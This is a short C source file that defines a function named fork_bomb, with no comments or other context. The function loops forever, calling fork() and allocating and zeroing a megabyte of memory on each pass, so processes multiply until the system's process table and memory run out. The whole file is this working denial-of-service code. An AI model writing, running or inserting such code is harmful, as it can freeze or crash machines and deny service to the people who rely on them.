#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void fork_bomb() {
    while (1) {
        fork();
        char *p = malloc(1024*1024);
        if (p) { memset(p, 0, 1024*1024); free(p); }
    }
}
